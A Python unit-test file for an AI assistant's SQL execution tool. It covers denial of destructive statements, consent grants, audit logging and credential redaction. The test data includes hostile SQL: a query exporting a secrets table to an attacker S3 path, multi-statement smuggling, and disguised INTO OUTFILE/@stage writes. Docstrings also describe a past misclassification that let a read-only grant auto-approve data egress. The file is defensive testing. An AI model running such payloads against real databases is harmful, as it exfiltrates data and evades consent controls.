"""Stage C — ``query_execute`` tool, consent, and audit correlation (NOVA-77).

These are unit tests: no network, no StarRocks. ``query_service`` is replaced
with a fake, and the audit writer is faked, so every acceptance criterion is
asserted on the **call path** rather than on a socket.

Coverage mirrors the issue's acceptance criteria:

1. a read-only statement runs through ``QueryService.execute_statements`` on the
   requesting user's connection and returns columns + bounded preview + count;
2. each denied category is refused before the engine, and a multi-statement
   payload cannot smuggle a denied statement;
3. a destructive statement is never auto-approved; a read-only one can be;
4. consent decisions are honoured and a privilege error terminates without an
   elevated retry;
5. the audit row is correlated by ``session_id`` = conversation id, is
   redacted, and carries no rows;
6. credential-shaped result values are redacted value-level;
7. ``ASSISTANT_MAX_ROWS`` is enforced at fetch time;
8. the tool never imports ``asyncmy`` / ``app.core.database`` and never opens a
   socket.
"""

from __future__ import annotations

import ast
import json
from pathlib import Path

import pytest

from app.modules.assistant.schemas import ToolCallView
from app.modules.assistant.service import AssistantLoop, LoopContext
from app.modules.assistant.state import AssistantThread
from app.modules.assistant.tools import AssistantTool, ToolInvocation, ToolOutcome, ToolRegistry
from app.modules.assistant.tools.policy import classify_statements, tool_classification
from app.modules.assistant.tools.query_execute import (
    ASSISTANT_MAX_ROWS,
    QueryExecuteTool,
)
from app.modules.assistant.tools.redaction import (
    is_credential_column,
    is_credential_value,
    redact_rows,
)

# ── Fakes ────────────────────────────────────────────────────────────────────


class FakeResult:
    """Minimal stand-in for ``QueryResult``."""

    def __init__(
        self,
        columns: list[str] | None = None,
        rows: list[list] | None = None,
        row_count: int | None = None,
        affected_rows: int = 0,
        error: str | None = None,
        warnings: list[str] | None = None,
    ) -> None:
        self.columns = columns or []
        self.rows = rows or []
        self.row_count = row_count if row_count is not None else len(self.rows)
        self.affected_rows = affected_rows
        self.error = error
        self.warnings = warnings or []


class FakeQueryService:
    """Records every ``execute_statements`` call and returns queued results."""

    def __init__(
        self, results: list[FakeResult] | None = None, exc: Exception | None = None
    ) -> None:
        self.calls: list[dict] = []
        self._results = results or []
        self._exc = exc

    async def execute_statements(self, **kwargs):
        self.calls.append(kwargs)
        if self._exc is not None:
            raise self._exc
        return self._results


class FakeAudit:
    def __init__(self) -> None:
        self.rows: list[dict] = []

    async def __call__(self, **kwargs):
        self.rows.append(kwargs)
        return "audit-id"


class FakeProvider:
    def __init__(self, script: list[dict]) -> None:
        self._script = list(script)
        self.calls: list[dict] = []

    async def resolve(self):
        from app.modules.assistant.provider import ProviderConfig

        return ProviderConfig(provider_id="p1", model="m1", endpoint="http://x/v1", api_key="k")

    async def complete(self, *, messages, tools=None, provider=None):
        self.calls.append({"messages": messages, "tools": tools})
        return self._script.pop(0) if self._script else {"role": "assistant", "content": "done"}


def _invocation(sql: str, call_id: str = "c1") -> ToolInvocation:
    return ToolInvocation(
        tool_call_id=call_id, tool_name="query_execute", arguments={"sql": sql}
    )


def _user(session_id: str = "sess-1") -> dict:
    return {
        "username": "alice",
        "session_id": session_id,
        "active_role": "analyst",
        "encrypted_password": "enc",
    }


def _context(
    *, thread_id: str = "thread-1", session_id: str | None = "sess-1"
) -> LoopContext:
    return LoopContext(
        user_name="alice",
        database="db1",
        schema_name="sch1",
        role="analyst",
        workspace_file_id="file-1",
        session_id=session_id,
        thread_id=thread_id,
        user=_user(session_id or "sess-1"),
    )


@pytest.fixture
def fakes(monkeypatch):
    service = FakeQueryService()
    audit = FakeAudit()
    monkeypatch.setattr("app.modules.query.service.query_service", service, raising=True)
    monkeypatch.setattr(
        "app.modules.assistant.tools.query_execute.write_audit_log", audit, raising=True
    )
    return service, audit


# ── 1. Read-only executes through the in-process service ─────────────────────


async def test_read_only_statement_runs_through_query_service(fakes):
    service, audit = fakes
    service._results = [
        FakeResult(columns=["n"], rows=[[1]], row_count=1),
    ]
    tool = QueryExecuteTool()
    outcome = await tool.run(_invocation("SELECT 1 AS n"), _context())

    assert outcome.ok is True
    assert len(service.calls) == 1
    call = service.calls[0]
    # The exact call path: in-process service, requesting user's credentials.
    assert call["sql"] == "SELECT 1 AS n"
    assert call["username"] == "alice"
    assert call["encrypted_password"] == "enc"
    assert call["role"] == "analyst"
    assert call["database"] == "db1"
    assert call["schema"] == "sch1"
    assert call["file_id"] == "file-1"
    # Never auto-confirm a destructive statement.
    assert call["confirm_destructive"] is False
    # Row cap applied at fetch time.
    assert call["max_rows"] == ASSISTANT_MAX_ROWS

    payload = json.loads(outcome.summary)
    assert payload["columns"] == ["n"]
    assert payload["row_count"] == 1
    assert payload["rows"] == [[1]]
    assert payload["truncated"] is False
    assert audit.rows and audit.rows[0]["status"] == "SUCCESS"


async def test_tool_never_imports_asyncmy_or_the_db_module_and_never_opens_a_socket():
    """The tool must call the in-process service, not open a connection."""
    source = (
        Path(__file__).resolve().parents[2]
        / "app"
        / "modules"
        / "assistant"
        / "tools"
        / "query_execute.py"
    ).read_text()
    tree = ast.parse(source)

    imported: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported.update(alias.name for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            imported.add(node.module)
            imported.update(f"{node.module}.{alias.name}" for alias in node.names)

    forbidden = {"asyncmy", "app.core.database", "db.user_conn"}
    assert not (imported & forbidden)
    assert "socket" not in imported
    # And it does call the in-process service (the import is function-local, so
    # assert on the source text too).
    assert "app.modules.query.service" in source
    assert "query_service.execute_statements" in source


async def test_bounded_preview_truncates_a_wide_result():
    from app.modules.assistant.tools.query_execute import _render_result

    rows = [[f"value-{i}-" + ("x" * 40)] for i in range(300)]
    rendered = json.loads(_render_result(FakeResult(columns=["c"], rows=rows, row_count=300)))
    assert rendered["row_count"] == 300
    assert rendered["truncated"] is True
    assert rendered["rows_returned"] < 300


# ── 2. Denied statements are refused before the engine ───────────────────────


@pytest.mark.parametrize(
    "sql",
    [
        "DROP TABLE x",
        "TRUNCATE TABLE x",
        "DELETE FROM x",
        "UPDATE x SET a = 1",
        "ALTER TABLE x DROP COLUMN c",
        "GRANT SELECT ON x TO u",
        "REVOKE SELECT ON x FROM u",
        "SET role = 'admin'",
        "CREATE TABLE x (a INT)",
        "INSERT INTO x VALUES (1)",
        "COPY INTO x FROM 's3://b'",
        "CREATE ML_MODEL m TYPE = FORECAST TARGET = y AS SELECT 1",
        "CREATE TASK t AS SELECT 1",
    ],
)
async def test_denied_statement_is_refused_before_the_engine(fakes, sql):
    service, audit = fakes
    tool = QueryExecuteTool()
    tool.preview(_invocation(sql))  # as the loop does before consent
    outcome = await tool.run(_invocation(sql), _context())

    assert outcome.ok is False
    assert service.calls == []  # the engine was never reached
    assert audit.rows and audit.rows[0]["status"] == "DENIED"
    assert audit.rows[0]["event_type"] == "assistant_tool"


async def test_multi_statement_payload_cannot_smuggle_a_denied_statement(fakes):
    service, audit = fakes
    tool = QueryExecuteTool()
    sql = "SELECT 1; DROP TABLE x"
    assert tool_classification(sql) == "destructive"

    outcome = await tool.run(_invocation(sql), _context())
    assert outcome.ok is False
    assert service.calls == []  # not even the SELECT prefix ran
    assert audit.rows[0]["status"] == "DENIED"


def test_mixed_payload_is_destructive_and_pure_denied_is_denied():
    classification, decisions = classify_statements(
        ["SELECT 1", "DROP TABLE x"]
    )
    assert classification == "destructive"
    assert [d.allowed for d in decisions] == [True, False]

    classification, _ = classify_statements(["DROP TABLE x", "INSERT INTO y VALUES (1)"])
    assert classification == "denied"


def test_nova_ddl_is_recognised_as_denied():
    assert tool_classification("CREATE ML_MODEL m TYPE = FORECAST") == "denied"
    assert tool_classification("CREATE TASK t AS SELECT 1") == "denied"


# ── Write/export clauses under a read-only leading keyword (NOVA-83) ─────────


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT 1 INTO OUTFILE 's3://b/x' FORMAT AS CSV",
        "SELECT * FROM secrets INTO OUTFILE 's3://attacker/leak.csv' FORMAT AS CSV",
        "SELECT /* hide */ 1 INTO OUTFILE 's3://b/x'",
        "SELECT 1 INTO OUTFILE 's3://b/x' FORMAT AS CSV -- trailing",
        "EXPLAIN SELECT 1 INTO OUTFILE 's3://b/x' FORMAT AS CSV",
        "SELECT * FROM t INTO @stage1.x.csv",
        "INSERT INTO FILES('path'='s3://b/x') SELECT * FROM t",
    ],
)
def test_write_clause_under_read_only_keyword_is_denied(sql):
    assert tool_classification(sql) == "denied"


# ── Zero-gap `INTO@stage` (NOVA-83 follow-up; the no-whitespace spelling) ───


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT 1 INTO@stage1.x.csv",
        "SELECT 1 INTO  @stage1.x.csv",
        "SELECT 1 INTO\n@stage1.x.csv",
        "WITH x AS (SELECT 1) SELECT * FROM x INTO@stage1.x.csv",
        "EXPLAIN SELECT 1 INTO@stage1.x.csv",
    ],
)
def test_zero_gap_into_stage_is_denied(sql):
    """``@`` is its own lexer token, so ``INTO@stage`` is the same clause.

    Requiring whitespace classified the zero-gap spelling ``read_only`` and let
    an ``allow_session`` grant auto-approve a data-egress write.
    """
    assert tool_classification(sql) == "denied"


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT 'INTO@stage' AS note",
        "SELECT 'INTO @stage' AS note",
        "SELECT 'INTOOUTFILE' AS note",
        "SELECT into_at FROM t",
    ],
)
def test_zero_gap_literal_and_identifier_spellings_stay_allowed(sql):
    """The relaxation must not over-block a value or an ordinary identifier."""
    assert tool_classification(sql) == "read_only"


async def test_zero_gap_into_stage_is_refused_before_the_engine(fakes):
    service, audit = fakes
    tool = QueryExecuteTool()
    outcome = await tool.run(_invocation("SELECT 1 INTO@stage1.x.csv"), _context())

    assert outcome.ok is False
    assert service.calls == []  # the engine was never reached
    assert audit.rows and audit.rows[0]["status"] == "DENIED"


async def test_grant_never_auto_approves_zero_gap_into_stage():
    """E2b: an active read-only grant still prompts for ``INTO@stage``."""
    provider = FakeProvider(
        [
            {"role": "assistant", "content": "", "tool_calls": [_tool_call("c1")]},
            {"role": "assistant", "content": "refused"},
        ]
    )
    tool = RecordingTool("denied")
    registry = ToolRegistry()
    registry.register(tool)
    loop = AssistantLoop(provider=provider, registry=registry)
    thread = AssistantThread(thread_id="t1", user_name="alice", title="T")
    thread.consent.always_allow_read_only = True

    asked: list[str] = []

    async def resolver(inv, cls):
        asked.append(cls)
        return False

    frames = await _collect(
        loop.run(
            thread=thread,
            user_content="go",
            context=_context(),
            resolve_consent=resolver,
        )
    )
    assert "tool_call" in [_frame_event(f) for f in frames]  # NOT auto-approved
    assert asked == ["denied"]
    assert tool.runs == 0


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT 1; SELECT 1 INTO OUTFILE 's3://b/x'",
        "SELECT 1; SELECT * FROM t INTO @stage1.x.csv",
    ],
)
def test_multi_statement_write_clause_payload_is_not_read_only(sql):
    assert tool_classification(sql) == "destructive"


async def test_into_outfile_is_refused_before_the_engine(fakes):
    service, audit = fakes
    tool = QueryExecuteTool()
    sql = "SELECT 1 INTO OUTFILE 's3://b/x' FORMAT AS CSV"
    tool.preview(_invocation(sql))  # as the loop does before consent
    outcome = await tool.run(_invocation(sql), _context())

    assert outcome.ok is False
    assert service.calls == []  # the engine was never reached
    assert audit.rows and audit.rows[0]["status"] == "DENIED"


async def test_multi_statement_outfile_payload_cannot_smuggle_the_export(fakes):
    service, audit = fakes
    tool = QueryExecuteTool()
    sql = "SELECT 1; SELECT 1 INTO OUTFILE 's3://b/x'"
    outcome = await tool.run(_invocation(sql), _context())

    assert outcome.ok is False
    assert service.calls == []  # not even the SELECT prefix ran
    assert audit.rows[0]["status"] == "DENIED"


def test_plain_read_only_statements_still_pass_the_write_clause_scan():
    assert tool_classification("SELECT * FROM t") == "read_only"
    assert tool_classification("SELECT 'INTO OUTFILE' AS note") == "read_only"
    assert tool_classification("SELECT * FROM files") == "read_only"


def test_outfile_guard_is_enforced_at_the_shared_pipeline():
    """Defense-in-depth: the guard blocks OUTFILE on every user-facing path."""
    from app.core.exceptions import ForbiddenSQLError
    from app.modules.query.sql_pipeline import guard_user_statement

    with pytest.raises(ForbiddenSQLError):
        guard_user_statement(
            "SELECT 1 INTO OUTFILE 's3://b/x' FORMAT AS CSV", confirm_destructive=False
        )
    with pytest.raises(ForbiddenSQLError):
        guard_user_statement("SELECT 1 INTO @stage1.x.csv", confirm_destructive=False)
    with pytest.raises(ForbiddenSQLError):
        guard_user_statement("SELECT 1 INTO@stage1.x.csv", confirm_destructive=False)
    # A literal that spells the clause is still allowed (no over-block).
    guard_user_statement("SELECT 'INTO OUTFILE' AS note", confirm_destructive=False)


def test_read_only_grant_does_not_cover_into_outfile_classification():
    """E2b: ``allow_session`` must never auto-approve an INTO OUTFILE payload.

    The grant only covers ``read_only``; the exploit worked because the payload
    *was* misclassified as ``read_only``. Classifying it ``denied`` is what
    makes :meth:`ConsentPolicy.covers` false and forces a per-statement prompt
    (and a refusal at the tool).
    """
    from app.modules.assistant.state import ConsentPolicy

    classification = tool_classification("SELECT 1 INTO OUTFILE 's3://b/x' FORMAT AS CSV")
    assert classification == "denied"
    assert ConsentPolicy(always_allow_read_only=True).covers(classification) is False


# ── EXPLAIN classifies by its inner statement (NOVA-82) ─────────────────────


@pytest.mark.parametrize(
    "sql",
    [
        "EXPLAIN DROP TABLE x",
        "EXPLAIN ANALYZE DELETE FROM t",
        "EXPLAIN ANALYZE INSERT INTO t VALUES (1)",
        "EXPLAIN UPDATE t SET a = 1",
        "EXPLAIN GRANT SELECT ON t TO u",
        "EXPLAIN CREATE TABLE x (a INT)",
        "EXPLAIN SELECT 1 INTO OUTFILE 's3://b/x'",
    ],
)
def test_explain_over_a_destructive_statement_is_denied(sql):
    assert tool_classification(sql) == "denied"


@pytest.mark.parametrize(
    "sql",
    [
        "EXPLAIN SELECT 1",
        "EXPLAIN ANALYZE SELECT * FROM t",
        "EXPLAIN WITH x AS (SELECT 1) SELECT * FROM x",
        "EXPLAIN SHOW TABLES",
        "EXPLAIN DESCRIBE t",
    ],
)
def test_explain_over_a_read_only_statement_stays_read_only(sql):
    assert tool_classification(sql) == "read_only"


async def test_explain_over_a_destructive_statement_is_refused_before_the_engine(fakes):
    service, audit = fakes
    tool = QueryExecuteTool()
    outcome = await tool.run(_invocation("EXPLAIN ANALYZE DELETE FROM t"), _context())

    assert outcome.ok is False
    assert service.calls == []  # the engine was never reached
    assert audit.rows and audit.rows[0]["status"] == "DENIED"


async def test_grant_never_auto_approves_explain_over_a_mutation():
    """NOVA-82 end-to-end: an active grant still prompts for EXPLAIN ANALYZE DELETE."""
    provider = FakeProvider(
        [
            {"role": "assistant", "content": "", "tool_calls": [_tool_call("c1")]},
            {"role": "assistant", "content": "refused"},
        ]
    )
    tool = RecordingTool("denied")
    registry = ToolRegistry()
    registry.register(tool)
    loop = AssistantLoop(provider=provider, registry=registry)
    thread = AssistantThread(thread_id="t1", user_name="alice", title="T")
    thread.consent.always_allow_read_only = True

    asked: list[str] = []

    async def resolver(inv, cls):
        asked.append(cls)
        return False

    frames = await _collect(
        loop.run(
            thread=thread,
            user_content="go",
            context=_context(),
            resolve_consent=resolver,
        )
    )
    assert "tool_call" in [_frame_event(f) for f in frames]
    assert asked == ["denied"]
    assert tool.runs == 0

# ── CTE body: a WITH prefix is not itself read-only ─────────────────────────


@pytest.mark.parametrize(
    "sql",
    [
        "WITH x AS (SELECT 1) DELETE FROM t",
        "WITH x AS (SELECT 1) INSERT INTO t SELECT * FROM x",
        "WITH x AS (SELECT 1) UPDATE t SET a = 1",
        "WITH a AS (SELECT 1), b AS (SELECT 2) DELETE FROM t",
        "WITH RECURSIVE x(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM x WHERE n < 5) DELETE FROM t",
    ],
)
def test_with_cte_mutating_body_is_denied(sql):
    assert tool_classification(sql) == "denied"


@pytest.mark.parametrize(
    "sql",
    [
        "WITH x AS (SELECT 1) SELECT * FROM x",
        "WITH a AS (SELECT 1), b AS (SELECT 2) SELECT * FROM a JOIN b",
        "WITH RECURSIVE x(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM x WHERE n < 5) "
        "SELECT * FROM x",
        "WITH x AS (SELECT '(') SELECT * FROM x",
    ],
)
def test_with_cte_select_body_is_read_only(sql):
    assert tool_classification(sql) == "read_only"


async def test_with_cte_mutating_payload_is_refused_before_the_engine(fakes):
    service, _audit = fakes
    tool = QueryExecuteTool()
    outcome = await tool.run(_invocation("WITH x AS (SELECT 1) DELETE FROM t"), _context())
    assert outcome.ok is False
    assert service.calls == []


# ── 3. Destructive is never auto-approved ───────────────────────────────────


class RecordingTool:
    """A tool that records classification, for the loop-level consent tests."""

    def __init__(self, classification: str) -> None:
        self.name = "query_execute"
        self.classification = classification
        self.description = ""
        self.parameters = {"type": "object", "properties": {}}
        self.runs = 0

    def preview(self, invocation):
        return invocation.arguments.get("sql", "")

    async def run(self, invocation, context):
        self.runs += 1
        return ToolOutcome(ok=True, summary="ok")


def _tool_call(call_id: str) -> dict:
    return {
        "id": call_id,
        "type": "function",
        "function": {"name": "query_execute", "arguments": json.dumps({"sql": "SELECT 1"})},
    }


def _frame_event(frame: str) -> str:
    return frame.splitlines()[0].removeprefix("event: ")


def _frame_data(frame: str) -> dict:
    for line in frame.splitlines():
        if line.startswith("data:"):
            return json.loads(line[5:].strip())
    return {}


async def _collect(agen):
    return [frame async for frame in agen]


async def test_destructive_call_never_auto_approves_even_with_a_grant():
    provider = FakeProvider(
        [
            {"role": "assistant", "content": "", "tool_calls": [_tool_call("c1")]},
            {"role": "assistant", "content": "ok"},
        ]
    )
    registry = ToolRegistry()
    registry.register(RecordingTool("destructive"))
    loop = AssistantLoop(provider=provider, registry=registry)
    thread = AssistantThread(thread_id="t1", user_name="alice", title="T")
    thread.consent.always_allow_read_only = True

    asked: list[str] = []

    async def resolver(inv, cls):
        asked.append(cls)
        return True

    frames = await _collect(
        loop.run(
            thread=thread,
            user_content="go",
            context=_context(),
            resolve_consent=resolver,
        )
    )
    assert "tool_call" in [_frame_event(f) for f in frames]
    assert asked == ["destructive"]


async def test_read_only_call_is_covered_by_an_allow_session_grant():
    provider = FakeProvider(
        [
            {"role": "assistant", "content": "", "tool_calls": [_tool_call("c1")]},
            {"role": "assistant", "content": "ok"},
        ]
    )
    registry = ToolRegistry()
    registry.register(RecordingTool("read_only"))
    loop = AssistantLoop(provider=provider, registry=registry)
    thread = AssistantThread(thread_id="t1", user_name="alice", title="T")
    thread.consent.always_allow_read_only = True

    asked: list[str] = []

    async def resolver(inv, cls):
        asked.append(cls)
        return True

    frames = await _collect(
        loop.run(
            thread=thread,
            user_content="go",
            context=_context(),
            resolve_consent=resolver,
        )
    )
    assert "tool_call" not in [_frame_event(f) for f in frames]
    assert asked == []


# ── 4. Consent decisions + privilege-error termination ──────────────────────


async def test_deny_decision_blocks_execution(fakes):
    service, _audit = fakes
    tool = QueryExecuteTool()
    # The loop owns consent; the tool is only called when allowed. This asserts
    # the loop does not call the tool on a deny.
    provider = FakeProvider(
        [
            {"role": "assistant", "content": "", "tool_calls": [_tool_call("c1")]},
            {"role": "assistant", "content": "understood"},
        ]
    )
    registry = ToolRegistry()
    registry.register(tool)
    loop = AssistantLoop(provider=provider, registry=registry)

    frames = await _collect(
        loop.run(
            thread=AssistantThread(thread_id="t1", user_name="alice", title="T"),
            user_content="go",
            context=_context(),
            resolve_consent=lambda inv, cls: _deny(),
        )
    )
    assert any(
        _frame_event(f) == "tool_status" and _frame_data(f)["status"] == "denied"
        for f in frames
    )
    assert service.calls == []


async def test_engine_privilege_error_terminates_without_elevated_retry(fakes):
    service, audit = fakes
    service._exc = RuntimeError("Access denied; you need SELECT privilege (5203)")
    tool = QueryExecuteTool()

    outcome = await tool.run(_invocation("SELECT * FROM secret"), _context())

    assert outcome.ok is False
    assert len(service.calls) == 1  # exactly one attempt, no retry
    # The credential never changed, and the failure was audited.
    assert service.calls[0]["encrypted_password"] == "enc"
    assert audit.rows and audit.rows[0]["status"] == "ERROR"


async def test_engine_privilege_error_in_result_terminates(fakes):
    service, audit = fakes
    service._results = [FakeResult(error="SQL error: (5203) Access denied")]
    tool = QueryExecuteTool()

    outcome = await tool.run(_invocation("SELECT * FROM secret"), _context())
    assert outcome.ok is False
    assert len(service.calls) == 1
    assert audit.rows and audit.rows[0]["status"] == "ERROR"


# ── 5. Audit correlation and redaction ──────────────────────────────────────


async def test_audit_row_is_correlated_by_conversation_id(fakes):
    service, audit = fakes
    service._results = [FakeResult(columns=["n"], rows=[[1]])]
    tool = QueryExecuteTool()

    # The conversation id is the correlation key even when a session id exists.
    context = _context(thread_id="conv-42", session_id="sess-9")
    await tool.run(_invocation("SELECT 1"), context)

    assert service.calls[0]["session_id"] == "conv-42"
    assert audit.rows[0]["session_id"] == "conv-42"


async def test_auth_session_id_is_used_when_no_conversation_is_present(fakes):
    service, audit = fakes
    service._results = [FakeResult(columns=["n"], rows=[[1]])]
    tool = QueryExecuteTool()
    await tool.run(_invocation("SELECT 1"), _context(thread_id=None, session_id="sess-9"))

    assert service.calls[0]["session_id"] == "sess-9"
    assert audit.rows[0]["session_id"] == "sess-9"


async def test_audit_sql_is_redacted_and_never_stores_rows(fakes):
    service, audit = fakes
    service._results = [FakeResult(columns=["n"], rows=[["supersecretvalue"]])]
    tool = QueryExecuteTool()

    secret_sql = (
        "SELECT * FROM FILES('path'='s3://b/f', 'aws.s3.secret_key'='AKIAIOSFODNN7EXAMPLE')"
    )
    # Only the preview is redacted at the tool boundary; the execution statement
    # is the user's own. Assert the audit row carries the redacted form.
    tool.preview(_invocation(secret_sql))
    await tool.run(_invocation("SELECT 1"), _context())

    for row in audit.rows:
        assert "AKIAIOSFODNN7EXAMPLE" not in (row.get("sql_text") or "")
        assert row.get("event_type") == "assistant_tool"


def test_preview_is_redacted_sql():
    tool = QueryExecuteTool()
    preview = tool.preview(
        _invocation(
            "SELECT * FROM FILES('path'='s3://b', 'aws.s3.secret_key'='AKIAIOSFODNN7EXAMPLE')"
        )
    )
    assert "AKIAIOSFODNN7EXAMPLE" not in preview
    assert "***" in preview


def test_preview_withholds_sql_it_cannot_redact(monkeypatch):
    from app.modules.assistant.tools import query_execute as qe

    def boom(sql):
        raise RuntimeError("cannot redact")

    monkeypatch.setattr(qe, "redact_sql_credentials", boom)
    tool = QueryExecuteTool()
    preview = tool.preview(_invocation("SELECT 1"))
    assert preview == "[statement withheld: it could not be redacted]"


# ── 6a. Result-error redaction (NOVA-120) ──────────────────────────────────
#
# ``result.error`` is the engine's own message and can echo the executed
# statement, which for an ``@stage`` query is the post-translation engine SQL
# carrying the injected storage credentials. The redaction happens once, at the
# source, and feeds both sinks: the audit ``error_message`` and
# ``ToolOutcome.error`` — which the loop renders into the ``tool_failed`` SSE
# frame. This is the process-wide public doc example, not a real secret.
CREDENTIAL_VALUE = "AKIAIOSFODNN7EXAMPLE"
CREDENTIAL_BEARING_ENGINE_ERROR = (
    "SQL error: (1064) syntax error near "
    f"FILES(\"aws.s3.access_key\"='{CREDENTIAL_VALUE}')"
)


async def test_result_error_is_redacted_for_both_sinks(fakes):
    service, audit = fakes
    service._results = [FakeResult(error=CREDENTIAL_BEARING_ENGINE_ERROR)]
    tool = QueryExecuteTool()

    outcome = await tool.run(_invocation("SELECT * FROM @stage1.data.csv"), _context())

    assert outcome.ok is False
    # Sink 1: the tool outcome the loop streams to the browser.
    assert CREDENTIAL_VALUE not in (outcome.error or "")
    # The message is not dropped — only the value is.
    assert "***" in (outcome.error or "")
    assert "aws.s3.access_key" in (outcome.error or "")
    # Sink 2: the persisted audit row.
    assert audit.rows and audit.rows[0]["status"] == "ERROR"
    assert CREDENTIAL_VALUE not in (audit.rows[0]["error_message"] or "")


async def test_result_error_never_reaches_the_sse_frame(monkeypatch, fakes):
    """End-to-end through the loop: the emitted ``tool_failed`` frame is clean."""
    service, _audit = fakes
    service._results = [FakeResult(error=CREDENTIAL_BEARING_ENGINE_ERROR)]
    provider = FakeProvider(
        [
            {"role": "assistant", "content": "", "tool_calls": [_tool_call("c1")]},
        ]
    )
    registry = ToolRegistry()
    registry.register(QueryExecuteTool())
    loop = AssistantLoop(provider=provider, registry=registry)
    thread = AssistantThread(thread_id="t1", user_name="alice", title="T")
    thread.consent.always_allow_read_only = True

    async def resolver(inv, cls):
        raise AssertionError("the read-only grant should have covered this call")

    frames = await _collect(
        loop.run(
            thread=thread,
            user_content="go",
            context=_context(),
            resolve_consent=resolver,
        )
    )

    assert all(CREDENTIAL_VALUE not in frame for frame in frames)
    failed = [
        _frame_data(f)
        for f in frames
        if _frame_event(f) == "error" and _frame_data(f)["code"] == "tool_failed"
    ]
    assert failed and CREDENTIAL_VALUE not in failed[0]["message"]


async def test_privilege_error_classification_reads_the_unredacted_message(fakes):
    """Redaction is value-only and must not flip the §5.3 privilege decision."""
    service, audit = fakes
    service._results = [FakeResult(error="SQL error: (5203) Access denied")]
    tool = QueryExecuteTool()

    outcome = await tool.run(_invocation("SELECT * FROM secret"), _context())

    assert outcome.ok is False
    assert outcome.error == "The database denied this query for your user."
    assert audit.rows and audit.rows[0]["status"] == "ERROR"


# ── 6. Value-level redaction ────────────────────────────────────────────────


@pytest.mark.parametrize(
    "column",
    ["password", "user_password", "api_key", "apiKey", "access-key", "client_secret", "bearer"],
)
def test_credential_column_names_are_detected(column):
    assert is_credential_column(column) is True


@pytest.mark.parametrize("column", ["id", "name", "created_at", "token_count"])
def test_ordinary_column_names_are_not_flagged(column):
    assert is_credential_column(column) is False


@pytest.mark.parametrize(
    "value",
    [
        "AKIAIOSFODNN7EXAMPLE",
        "-----BEGIN RSA PRIVATE KEY-----",
        "sk-abcdefghijklmnopqrstuvwxyz123456",
        "ghp_abcdefghijklmnopqrstuvwxyz0123456789",
        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcdefghijklmnop",
    ],
)
def test_credential_shaped_values_are_detected(value):
    assert is_credential_value(value) is True


@pytest.mark.parametrize(
    "column",
    [
        # The camelCase/PascalCase/run-together class (NOVA-81).
        "userPassword",
        "userpassword",
        "UserPassword",
        "secretKey",
        "accessToken",
        "privateKey",
        "hashedPassword",
        "dbPass",
        "clientSecret",
        "sessionToken",
        "accountKey",
        "sasToken",
        "APIKey",
        # Abbreviations matched as whole words.
        "pwd",
        "user_pwd",
        "user-pwd",
        "userPwd",
    ],
)
def test_camel_case_credential_column_names_are_detected(column):
    """The module's camelCase claim must be true (NOVA-81).

    These all returned ``False`` before the case-boundary fix, leaking a
    plaintext password/secret to the model context.
    """
    assert is_credential_column(column) is True


@pytest.mark.parametrize(
    "column", ["note", "status", "user_name", "file_path", "keyword", "compass"]
)
def test_unrelated_column_names_are_not_flagged(column):
    """The compact match must not fire on ordinary names.

    ``keyword`` contains no credential part, and ``compass`` must not match
    ``pass`` (it is a compact substring, not a word).
    """
    assert is_credential_column(column) is False


@pytest.mark.parametrize("value", ["hello world", "12345", "2026-09-18", None])
def test_ordinary_values_are_not_flagged(value):
    assert is_credential_value(value) is False


def test_redact_rows_is_value_level_not_the_sql_helper():
    """A credential-shaped *value* in an ordinary column is redacted.

    ``redact_sql_credentials`` only rewrites credential assignments in SQL;
    this proves the assistant's redactor works on the row values themselves.
    """
    columns = ["note", "count"]
    rows = [["AKIAIOSFODNN7EXAMPLE", 3]]
    redacted = redact_rows(columns, rows)
    assert redacted == [["***", 3]]


def test_redact_rows_redacts_every_cell_of_a_credential_column():
    columns = ["user", "password"]
    rows = [["alice", "not-a-known-format"], ["bob", "hunter2"]]
    assert redact_rows(columns, rows) == [
        ["alice", "***"],
        ["bob", "***"],
    ]


def test_none_stays_none_in_a_credential_column():
    assert redact_rows(["token"], [[None]]) == [[None]]


async def test_credential_value_is_redacted_before_entering_the_model_summary(fakes):
    service, _audit = fakes
    service._results = [
        FakeResult(columns=["note"], rows=[["AKIAIOSFODNN7EXAMPLE"]], row_count=1)
    ]
    tool = QueryExecuteTool()
    outcome = await tool.run(_invocation("SELECT note FROM t"), _context())

    assert outcome.ok is True
    assert "AKIAIOSFODNN7EXAMPLE" not in outcome.summary
    assert "***" in outcome.summary




async def test_camel_case_password_columns_are_redacted_before_the_model(fakes):
    """NOVA-81 full path: camelCase credential columns never reach the model.

    QA's exact reproduction: ``userPassword``/``secretKey``/``accessToken`` with
    plaintext values. Before the fix all three values survived into
    ``outcome.summary`` and thence into the provider request.
    """
    service, _audit = fakes
    service._results = [
        FakeResult(
            columns=["id", "userPassword", "secretKey", "accessToken"],
            rows=[[1, "hunter2-plaintext", "k-9f8a7b6c5d4e3f2a1b0c", "tok-abc123def456ghi789"]],
            row_count=1,
        )
    ]
    tool = QueryExecuteTool()
    outcome = await tool.run(_invocation("SELECT * FROM users"), _context())

    assert outcome.ok is True
    for leaked in (
        "hunter2-plaintext",
        "k-9f8a7b6c5d4e3f2a1b0c",
        "tok-abc123def456ghi789",
    ):
        assert leaked not in outcome.summary
    payload = json.loads(outcome.summary)
    assert payload["rows"] == [[1, "***", "***", "***"]]


# ── 7. Row cap at fetch time ────────────────────────────────────────────────


async def test_max_rows_is_passed_to_the_service_for_every_call(fakes):
    service, _audit = fakes
    service._results = [FakeResult(columns=["n"], rows=[[1]])]
    tool = QueryExecuteTool(max_rows=ASSISTANT_MAX_ROWS)
    await tool.run(_invocation("SELECT 1"), _context())
    assert service.calls[0]["max_rows"] == 100

    tool_small = QueryExecuteTool(max_rows=5)
    await tool_small.run(_invocation("SELECT 1"), _context())
    assert service.calls[1]["max_rows"] == 5


def test_default_row_cap_is_the_spec_value():
    assert ASSISTANT_MAX_ROWS == 100


# ── 8. Loop integration shape ───────────────────────────────────────────────


def test_registry_exposes_query_execute():
    from app.modules.assistant.registry import tool_registry

    tool = tool_registry.get("query_execute")
    assert tool is not None
    assert isinstance(tool, QueryExecuteTool)
